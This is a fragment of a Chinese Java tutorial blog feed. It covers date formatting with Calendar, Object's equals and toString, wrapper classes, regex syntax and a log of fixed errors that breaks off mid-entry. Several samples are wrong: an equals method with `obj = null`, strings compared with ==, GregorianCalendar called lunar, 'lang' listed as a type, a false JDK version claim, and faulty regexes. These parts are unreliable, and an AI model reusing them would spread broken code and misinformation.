class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sdf<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 17-03/18 06:27.13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 String 转换为 Date 类型演示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> time <span class="token operator">=</span> <span class="token string">"2002-02-22 22:22:22"</span><span class="token punctuation">;</span><span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//格式需要与待转换的 String 格式相同</span><span class="token class-name">Date</span> date<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>date <span class="token operator">=</span> sdf<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//有可能抛出异常，所以需要使用 try/catch 来捕有可能发生的异常</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里为 1970 01 01 00:00:00 到 2002-02-22 22:22:22 的毫秒数</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>将 String 转换为 Date 类型时，SimpleDateFormat 指定的格式需要与待转换的 String 时间格式相同</strong></p></blockquote><br>## Calendar ##java.util.Calendar 封装了日历信息。主要作用在于其方法可以对时间进行计算。<p>Calender 是<strong>抽象类</strong>，规定了操作时间的相关方法。<br>常用的子类：GregorianCalendar 即阴历历法。</p><p>Calender 提供了一个静态方法 getInstance()，可以获取一个当前系统所在地区适用的 Calendar 实例。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Calendar</span> c <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前系统所在时区的 Calendar 实例，默认为当前时间</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>**getTime() 方法**：获取 Date 类型的时间，返回值为 Date 类型。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Date</span> d <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>**set(int field, int value) 方法**：设置日期及时间分量，该方法没有返回值：<pre class="line-numbers language-java" data-language="java"><code class="language-java">c<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">YEAR</span><span class="token punctuation">,</span> <span class="token number">2008</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置年份</span>c<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">MONTH</span><span class="token punctuation">,</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">AUGUST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//月从 0 开始，为了防止混淆，建议使用内部常量表示</span>c<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">DAY_OF_MONTH</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置月中的第几天</span>c<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">HOUR_OF_DAY</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置小时</span>c<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">MINUTE</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置分钟</span>c<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">SECOND</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置秒</span>d <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 Fri Aug 08 20:08:08 CST 2008</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>**get(int field) 方法**：获取日期的时间分量，返回 int 类型：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> year <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">YEAR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Calender 中的月是从 0 开始，所以想要表示真实的月份需要加 1</span><span class="token keyword">int</span> month <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">MONTH</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> day <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">DAY_OF_MONTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Calendar 中的每星期的第一天是周日，所以想表示中国的星期需要减 1</span><span class="token keyword">int</span> week <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">DAY_OF_WEEK</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> hour <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">HOUR_OF_DAY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> minute <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">MINUTE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> second <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">SECOND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>year <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> month <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> day <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> hour <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> minute <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> second <span class="token operator">+</span> <span class="token string">" 星期"</span> <span class="token operator">+</span> week<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 2017-3-16 19:22:11 星期 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>重要的事要多强调！</strong></p><blockquote><p>Calender 中的月是从 0 开始，所以想要表示真实的月份需要加 1<br>Calendar 星期中的第一天是周日，所以想表示中国的星期需要减 1</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日期 </tag>
            
            <tag> Date </tag>
            
            <tag> SimplaDateFormat </tag>
            
            <tag> Calendar </tag>
            
            <tag> 日期格式化 </tag>
            
            <tag> 时间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Object 和包装类</title>
      <link href="/2017/03/15/object-he-bao-zhuang-lei/"/>
      <url>/2017/03/15/object-he-bao-zhuang-lei/</url>
      
        <content type="html"><![CDATA[<h2 id="Object"><a href="#Object" class="headerlink" title="Object:"></a>Object:</h2><p>Java 中，有一个神通广大的超类，它就是 Object，Object 位于 java.lang 包下面，所有类的父类都集成自 Object。所以 Object 类型的引用变量可以指向任何类型。<br><strong>Object 有两个核心方法：toString 方法和 equals 方法</strong></p><h3 id="toString-方法："><a href="#toString-方法：" class="headerlink" title="toString 方法："></a>toString 方法：</h3><p><strong>toString 方法返回值为 String 类型，用于返回对象值，即内存中的位置。</strong><br>Object 类中的 toString 方法返回的字符串为：类名@散列码</p><blockquote><p>Java 中很多地方默认调用对象的 toString()，如果不重写 toString() 方法，将会使用父类的 toString() 方法。所以强烈建议为自定义的类，重写 toString()方法</p></blockquote><p><strong>重写 toString():</strong><br>对于重写的 toString() 方法所返回字符串格式，没有统一的要求，原则上返回字符串应当包含当前类的属性。</p><blockquote><p>推荐使用 JSON 格式~</p></blockquote><br>### equals 方法： ###**equals(Object object)方法返回类型为 boolean 类型，用于判断一个对象是否等于另一个对象****Object 类中的该方法采用 == 进行判断两个对象是否相同**（存储地址相同），而在实际开发中一般需要重写 equals 方法，通过比较对象的属性来判断对象像不像。使得 equals 更有意义。（不重写则等同于 ==）<p><strong>重写 equals 的方法需要具有以下特性：</strong></p><ul><li><strong>自反性</strong>：对于任何非空引用 x，x.equals(x) 应当返回 true。</li><li><strong>对称性</strong>：对于任何引用 x 和 y，当且仅当 y.equals(x) 返回 true，x.equals(y) 也应该返回 true。</li><li><strong>传递性</strong>：对于任何引用 x、y 和 z，如果 x.euqals(y) 返回 true，y.equals(z) 返回 true，则 x.equals(z) 也应该返回 true。</li><li><strong>一致性</strong>：如果 x 和 y 引用的对象没有发生变化，反复调用 x.equals(y) 应该返回同样的结果。</li><li>对于任意<strong>非空</strong>引用 x，x.equals(null) 应该返回 false。</li></ul><p><strong>重写 equals 的步骤：</strong></p><ul><li>检测 obj 是否为 null，如果为 null，返回 false。</li><li>检测 this 与 obj 是否引用同一个对象（任何对象与 自己 比较返回 true）。</li><li>比较 this 与 obj 是否同属一个类。如果 equals 方法在每个子类中有所改变，就是用 getClass 检测；如果所有的子类都有一样的 equals 方法，就用 instanceof 检测。</li><li>如果使用 instanceof 检测，将 obj 转换为相应的类类型变量</li><li>根据需求比较像不像。使用 == 比较基本类型，使用 equals 比较对象域。</li></ul><p>代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//判断是否为空</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">==</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//判断是否是自己</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Person</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//假如这是 Person 类的 equals 方法</span><span class="token class-name">Person</span> p <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>obj<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">&amp;&amp;</span> p<span class="token punctuation">.</span>age <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">&amp;&amp;</span> p<span class="token punctuation">.</span>sex <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token punctuation">;</span><span class="token comment">//这里根据实际需求来写</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### hashCode 方法hashCode() 方法又叫[散列函数](/2017/03/19/HashCode 散列码/#散列函数)，**若重写 equals 方法则必须重写 hashCode 方法。**<br>### == 和 equals 区别 ###**==**- 是运算符- 用于比较变量的值，可以任何类型，若是引用类型则比较两个对象存储的地址是否相同。**<p><strong>equals</strong></p><ul><li>是 Object 方法，重写之前与 == 效果完全一样</li><li>重写之后也是个方法…用于比较两个对象的内容是否一致（根据你的需求判断两个对象像不像）</li></ul><blockquote><p>重要的事情要多强调~ <strong>Object 默认的 equals 方法等同于 ==</strong></p></blockquote><br>## 包装类 ##所有基本数据类型都有一个与之对应的类，称为包装类。包装类是 final 修饰的，位于 java.lang 包下。**包装类的默认值是 null** <h3 id="8-个基本数据类型的包装类："><a href="#8-个基本数据类型的包装类：" class="headerlink" title="8 个基本数据类型的包装类："></a>8 个<a href="/2017/02/20/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/">基本数据类型</a>的包装类：</h3><table><thead><tr><th align="center">基本数据类型</th><th align="center">包装类</th><th align="center">父类</th></tr></thead><tbody><tr><td align="center">int</td><td align="center">java.lang.Integer</td><td align="center">java.lang.Number</td></tr><tr><td align="center">lang</td><td align="center">java.lang.Long</td><td align="center">java.lang.Number</td></tr><tr><td align="center">double</td><td align="center">java.lang.Double</td><td align="center">java.lang.Number</td></tr><tr><td align="center">short</td><td align="center">java.lang.Short</td><td align="center">java.lang.Number</td></tr><tr><td align="center">float</td><td align="center">java.lang.Float</td><td align="center">java.lang.Number</td></tr><tr><td align="center">byte</td><td align="center">java.lang.Byte</td><td align="center">java.lang.Number</td></tr><tr><td align="center">char</td><td align="center">java.lang.Character</td><td align="center">java.lang.Object</td></tr><tr><td align="center">boolean</td><td align="center">java.lang.Boolean</td><td align="center">java.lang.Object</td></tr></tbody></table><br>### 包装类中的常量： ###<table><thead><tr><th align="center">常量名</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">MAX_VALUE</td><td align="center">表示包装类的基本类型取值范围最大值</td></tr><tr><td align="center">MIN_VALUE</td><td align="center">表示包装类的基本类型取值范围最小值</td></tr></tbody></table><blockquote><p>char 和 boolean 中没有这两个常量</p></blockquote><br>### 基本类型转换为包装类： ###<ul><li>通过 new 关键字进行转换，如： <code>new Integer(21)</code></li><li>通过包装类提供的静态方法 valueOf 方法，如： <code>Integer.valueOf(21)</code></li></ul><br>### 包装类转基本类型 ###<ul><li>调用 XXXValue(XXX)，返回基本类型。如 <code>IntegerValue(new Integer(123))</code></li></ul><br>### 字符串转换基本类型： ###<p>通过包装类中的静态方法 parseXXX(String str)，将给定的字符串解析为对应的基本类型，<strong>前提是该字符串能正确的描述基本类型可以保存的值</strong>，若不能，则报错：java.lang.NumberFormatException</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"123"</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//i = 123</span><span class="token keyword">double</span> d <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//d = 123.0</span>str <span class="token operator">=</span> <span class="token string">"123abc"</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//报错：java.lang.NumberFormatException</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 自动拆装箱： ###JDK 5.0 (JDK 5.0 之后的版本号改为 JDK 1.6，每一个大版本增加 0.1 )之后加入了自动拆装箱功能，自动拆装箱是依靠 JDK 5.0 的编译器在编译的时候预处理的。<p>自动拆箱：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//JDK 5.0 之后这样写不会报错</span><span class="token comment">//实际上编译器在生成字节码文件时会替换成如下代码</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>自动装箱：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token comment">//JDK 5.0 之后可以直接这样写</span><span class="token comment">//编译器会在生成字节码文件时替换为如下代码</span><span class="token class-name">Integer</span> a <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>由于<strong>包装类的默认值是 null</strong> ，意味着包装类可以存储 null 值。<br>所以在特定情况下更适合使用包装类，例如在数据库中数字类型数据有可能是空的，这时若使用 int 类型存储 null 值就会报错了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Object </tag>
            
            <tag> 超类 </tag>
            
            <tag> 包装类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式基础语法</title>
      <link href="/2017/03/15/regexgrammar/"/>
      <url>/2017/03/15/regexgrammar/</url>
      
        <content type="html"><![CDATA[<p>在实际开发中，经常需要对字符串进行一些复杂的匹配，查找，替换等操作，通过正则表达式可以方便实现字符串复杂的操作。正则表达式是一串特定的字符组成的一个规则字符串。</p><span id="more"></span><h2 id="正则表达式字符集"><a href="#正则表达式字符集" class="headerlink" title="正则表达式字符集"></a>正则表达式字符集</h2><table><thead><tr><th align="center">字符集</th><th align="center">字符集描述</th></tr></thead><tbody><tr><td align="center">[abc]</td><td align="center">a,b,c 中任意<strong>一个</strong>字符</td></tr><tr><td align="center">[^abc]</td><td align="center">除了 a,b,c 之外的任意字符</td></tr><tr><td align="center">[a-z]</td><td align="center">表示 a,b,c…z 中的任意<strong>一个</strong>字符</td></tr><tr><td align="center">[a-z]+</td><td align="center">表示由一个或多个 a,b,c…z 字符组成的字符串</td></tr><tr><td align="center">[0-9]</td><td align="center">表示 0 到 9 中间任意<strong>一个</strong>数字</td></tr><tr><td align="center">[a-zA-Z0-9]</td><td align="center">a-z,A-Z,0-9 中任意一个字符</td></tr></tbody></table><br>## 预定义字符集 ##<table><thead><tr><th align="center">预定义字符集</th><th align="center">预定义字符集描述</th></tr></thead><tbody><tr><td align="center">\d</td><td align="center">任意一个数字字符，相当于[0-9]</td></tr><tr><td align="center">\w</td><td align="center">单词字符,相当于[a-zA-Z0-9]</td></tr><tr><td align="center">\s</td><td align="center">空白字符</td></tr><tr><td align="center">\D</td><td align="center">非数字字符</td></tr><tr><td align="center">\W</td><td align="center">非单词字符</td></tr><tr><td align="center">\S</td><td align="center">非空白字符</td></tr><tr><td align="center">.</td><td align="center">任意一个字符</td></tr></tbody></table><br>## 数量词 ##<table><thead><tr><th align="center">数量词</th><th align="center">数量词描述</th></tr></thead><tbody><tr><td align="center">?</td><td align="center">0 个到 1 个</td></tr><tr><td align="center">*</td><td align="center">0 个到任意个</td></tr><tr><td align="center">+</td><td align="center">大于等于一个</td></tr><tr><td align="center">{n}</td><td align="center">n 个</td></tr><tr><td align="center">{n,}</td><td align="center">大于等于 n 个</td></tr><tr><td align="center">{n,m}</td><td align="center">n 到 m 个</td></tr></tbody></table><br>## 标识 ##<table><thead><tr><th align="center">数量词</th><th align="center">数量词描述</th></tr></thead><tbody><tr><td align="center">^</td><td align="center">代表字符开始</td></tr><tr><td align="center">$</td><td align="center">代表字符结束</td></tr><tr><td align="center">()</td><td align="center">代表分组，一系列正则表达式一个整体</td></tr><tr><td align="center">丨</td><td align="center">分组时可以用“丨”代表“或”的关系</td></tr></tbody></table><p>示例：<br>邮政编码：6 位数字</p><pre class="line-numbers language-Regex" data-language="Regex"><code class="language-Regex">^[0-9][0-9][0-9][0-9][0-9][0-9]$^\d\d\d\d\d\d\d$^\d{6}$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>电话号码：三种格式</p><ul><li>12345678910</li><li>0086 12345678910</li><li>+86 12345678910</li></ul><pre class="line-numbers language-Regex" data-language="Regex"><code class="language-Regex">^(+86|0086)?\s?\d{11}$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>电子邮箱：<a href="mailto:Bao_456@163.com">Bao_456@163.com</a></p><pre class="line-numbers language-Regex" data-language="Regex"><code class="language-Regex">^[a-zA-Z0-9_]+@[a-zA-Z0-9_]+(.[a-zA-Z]+)+$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## [在程序中使用正则表达式](/2017/03/14/深入了解 String/#根据正则表达式操作字符串的方法)<p>[传送门：根据正则表达式操作字符串](/2017/03/14/深入了解 String/#根据正则表达式操作字符串的方法)</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
            <tag> Regex </tag>
            
            <tag> Regular Expression </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经典 Issues 集锦</title>
      <link href="/2017/03/15/issues/"/>
      <url>/2017/03/15/issues/</url>
      
        <content type="html"><![CDATA[<p>什么是经验？经验，就是遇到问题之后，你通过努力把它解决了，这就是你的经验！</p><p>在程序员的道路上，会遇到各种各样的问题和错误，我认为我不可能记住每一个问题的解决方式，好脑子不如烂笔头嘛，所以我要把我今后遇到的各种问题与错误都记录在这里～</p><span id="more"></span><h2 id="Java-Issues"><a href="#Java-Issues" class="headerlink" title="Java Issues"></a>Java Issues</h2><h3 id="An-API-baseline-has-not-been-set-for-the-current-workspace"><a href="#An-API-baseline-has-not-been-set-for-the-current-workspace" class="headerlink" title="An API baseline has not been set for the current workspace."></a>An API baseline has not been set for the current workspace.</h3><p>Windows → Preferences → Plug-in Development → API Baselines<br>在 Options 里找到  Missing API baseline ，根据自己的情况改成 Warning 或者 Ignore，点击 Apply 应用即可。</p><blockquote><p>建议在<a href="http://www.ibm.com/developerworks/library/os-eclipse-api-tools/">这里</a>研读一下 API baselines ，然后再决定这些 API baselines 是否对你有用。</p></blockquote><br>### java.lang.ClassNotFoundException: com.mysql.jdbc.Driver<h4 id="报错信息："><a href="#报错信息：" class="headerlink" title="报错信息："></a>报错信息：</h4><p>java.lang.ClassNotFoundException: com.mysql.jdbc.Driver…</p><h4 id="报错原因："><a href="#报错原因：" class="headerlink" title="报错原因："></a>报错原因：</h4><ol><li>驱动类名称写错</li><li>没有添加 jar 包<ol><li>项目中没有添加 mysql-connector-java-x.x.xx-bin.jar 包</li><li>Web 项目中添加了 mysql-connector-java-x.x.xx-bin.jar 包，但是在 Tomcat 安装目录的 lib 目录下没有该 jar 包</li></ol></li></ol><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>对于第一种原因仔细查找下改掉拼错的单词就行了，不多解释啦。</li><li>对于第二种报错原因的第一种情况，下载 mysql-connector-java-x.x.xx-bin.jar 添加进去就可以了，这里也不多说。</li><li>悲催的我遇到了另一种情况，已经将 mysql-connector-java-x.x.xx-bin.jar 包添加到项目中，测试数据库连接也是没有问题的，但是在 server 中运行时却报错…此时只要将相同的 jar 包复制一份到 Tomcat 安装目录中的 lib 文件夹中重启 Tomcat 服务器即可。</li></ul><br>### ERROR StatusLogger No log4j2 configuration file found.<h4 id="报错信息：-1"><a href="#报错信息：-1" class="headerlink" title="报错信息："></a>报错信息：</h4><p>ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console. Set system property ‘org.apache.logging.log4j.simplelog.StatusLogger.level’ to TRACE to show Log4j2 internal initialization logging.</p><h4 id="报错原因：-1"><a href="#报错原因：-1" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>没有找到 log4j2 的配置文件</li></ul><h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><p>因为用的是 log4j2 所以不能按照大多数网站上写的配置 <code>log4j.properties</code> ，需要将配置文件名改为 <code>log4j2.properties</code>。</p><br>###  系统找不到指定的文件<h4 id="警告信息："><a href="#警告信息：" class="headerlink" title="警告信息："></a>警告信息：</h4><p>The file cannot be validated as the XML definition “项目路径\src\log4j.dtd (系统找不到指定的文件。)” that is specified as describing the syntax of the file cannot be located.</p><h4 id="报错原因：-2"><a href="#报错原因：-2" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>要么缺少 log4j.dtd 文件</li><li>log4j.dtd 名称写错。</li><li>log4j.dtd 文件未放在 src 目录下</li></ul><h4 id="解决办法：-1"><a href="#解决办法：-1" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>log4j.dtd 位置（若已有 log4j.dtd 文件则忽略此条）<ul><li>log4j 1.x：使用解压缩工具解压 log4j.jar 文件，找到 org/apache/log4j/xml 目录下的 log4j.dtd 文件。</li><li>log4j 2.x：使用解压缩工具解压 log4j-core-2.8.2.jar 文件，找到根目录下的 Log4j-events.dtd 文件。</li></ul></li><li>将找到的 log4j.dtd 文件拷贝到项目路径的 src 目录下即可。</li></ul><h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a href="http://blog.csdn.net/linshutao/article/details/6578788">log4j.xml 提示不能找到 log4j.dtd</a></p><br>### Project facet Java 1.8 is not supported by target runtime Apache Tomcat v7.0.<h4 id="报错信息：-2"><a href="#报错信息：-2" class="headerlink" title="报错信息："></a>报错信息：</h4><ul><li>Project facet Java 1.8 is not supported by target runtime Apache Tomcat v7.0.</li><li>Project facet Java version 1.8 is not supported.<br><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1ff4q9grjocj20el0goaae.jpg" alt="Project facet Java version 1.8 is not supported."></li></ul><h4 id="报错原因：-3"><a href="#报错原因：-3" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>根本原因：JDK 的版本与 Tomcat 设置的版本不匹配</li><li>可能是你导入的项目中的 JDK 与你的 Tomcat 